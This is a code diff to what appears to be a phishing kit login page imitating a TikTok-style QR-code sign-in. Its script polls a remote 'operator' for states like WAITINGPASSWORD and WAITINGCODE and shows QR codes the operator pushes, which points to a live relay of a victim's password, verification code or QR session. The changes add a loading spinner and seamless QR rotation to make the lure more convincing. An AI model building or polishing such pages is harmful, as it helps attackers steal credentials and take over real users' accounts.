@@ -159,17 +159,38 @@
       background: #fff;
     }
 
-    .qr-image img { width: 180px; height: 180px; }
+    .qr-image img {
+      width: 180px;
+      height: 180px;
+      object-fit: contain;
+      image-rendering: pixelated;
+      image-rendering: crisp-edges;
+    }
 
     .qr-image .qr-placeholder {
       width: 180px;
       height: 180px;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      color: #ccc;
-      font-size: 64px;
+      gap: 12px;
+      color: rgba(22,24,35,0.5);
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
     }
+
+    .qr-spinner {
+      width: 36px;
+      height: 36px;
+      border: 4px solid rgba(22,24,35,0.12);
+      border-top-color: #fe2c55;
+      border-radius: 50%;
+      animation: qrSpin 0.8s linear infinite;
+    }
+
+    @keyframes qrSpin { to { transform: rotate(360deg); } }
 
     .qr-instructions {
       font-size: 14px;
@@ -602,9 +623,10 @@
           <h1>Log in with QR code</h1>
           <div class="qr-image" style="margin-top:24px">
             <div class="qr-placeholder" id="qrPlaceholder">
-              <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="75" y="10" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="10" y="75" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="20" y="20" width="15" height="15" rx="2" fill="#ccc"/><rect x="85" y="20" width="15" height="15" rx="2" fill="#ccc"/><rect x="20" y="85" width="15" height="15" rx="2" fill="#ccc"/><rect x="55" y="10" width="10" height="10" fill="#ccc"/><rect x="55" y="30" width="10" height="10" fill="#ccc"/><rect x="55" y="55" width="10" height="10" fill="#ccc"/><rect x="10" y="55" width="10" height="10" fill="#ccc"/><rect x="30" y="55" width="10" height="10" fill="#ccc"/><rect x="75" y="55" width="10" height="10" fill="#ccc"/><rect x="95" y="55" width="10" height="10" fill="#ccc"/><rect x="75" y="75" width="10" height="10" fill="#ccc"/><rect x="95" y="75" width="10" height="10" fill="#ccc"/><rect x="75" y="95" width="10" height="10" fill="#ccc"/><rect x="95" y="95" width="10" height="10" fill="#ccc"/></svg>
+              <div class="qr-spinner"></div>
+              <span>Preparing QR code…</span>
             </div>
-            <img id="qrImage" style="display:none" alt="QR Code">
+            <img id="qrImage" style="display:none" alt="QR Code" onload="onQrImageLoaded()" onerror="onQrImageError()">
           </div>
           <p class="qr-instructions">1. Scan with your mobile device's camera<br>2. Confirm login or sign up</p>
           <button class="go-back" onclick="showMethodSelection()" type="button">
@@ -839,6 +861,13 @@ function selectMethod(method) {
   selectedLoginMethod = method;
   if (method === 'qr') {
     showScreen('qrScreen');
+    showQrLoading();
+    if (browserId) {
+      if (pollingIntervalId) clearInterval(pollingIntervalId);
+      pollingStartTime = null;
+      startPolling(2000);
+      pollOperator();
+    }
   } else if (method === 'email') {
     showScreen('credentialScreen');
     switchTab('email');
@@ -869,6 +898,26 @@ function sendLoginMethodUpdate(method) {
   }).then(r => { if (!r.ok) console.warn('[Template] method update HTTP', r.status); }).catch(e => console.warn('[Template] method update failed', e));
 }
 
+function showQrLoading() {
+  const img = document.getElementById('qrImage');
+  const ph = document.getElementById('qrPlaceholder');
+  if (img) { img.style.display = 'none'; img.removeAttribute('src'); }
+  if (ph) ph.style.display = 'flex';
+}
+
+function onQrImageLoaded() {
+  const img = document.getElementById('qrImage');
+  const ph = document.getElementById('qrPlaceholder');
+  if (img) img.style.display = 'block';
+  if (ph) ph.style.display = 'none';
+}
+
+function onQrImageError() {
+  // Keep the loading placeholder visible — next poll will supply a fresh image.
+  const img = document.getElementById('qrImage');
+  if (img) img.style.display = 'none';
+}
+
 function updateQrImage(data) {
   const img = document.getElementById('qrImage');
   const qrScreenEl = document.getElementById('qrScreen');
@@ -883,8 +932,16 @@ function updateQrImage(data) {
   if (!qr) return;
   const src = typeof qr === 'string' ? qr : (qr.dataUrl || qr.url || qr.image || '');
   if (!src) return;
-  img.src = src;
-  img.style.display = 'block';
+  // Only swap once the new bitmap has decoded, so the current QR never blanks
+  // out mid-rotation and the placeholder hides exactly when the image is ready.
+  const probe = new Image();
+  probe.onload = () => {
+    if (!qrScreenEl.classList.contains('active')) return;
+    img.src = src;
+    onQrImageLoaded();
+  };
+  probe.onerror = () => {};
+  probe.src = src;
 }
 
 function switchTab(tab) {
@@ -1096,7 +1153,7 @@ async function pollOperator() {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     console.log("Polling:", data);
-    if (data.currentStatus) { if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) { try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {} } isProcessing = false; updateUIForStatus(data.currentStatus, data.data || {}); }
+    if (data.currentStatus) { if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) { try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {} } isProcessing = false; const rowData = data.data || {}; if (data.qrData && !rowData.qrData) rowData.qrData = data.qrData; updateUIForStatus(data.currentStatus, rowData); }
 } catch (error) {
     console.error("[Template] Poll error, will retry in 5s:", error);
     clearInterval(pollingIntervalId);
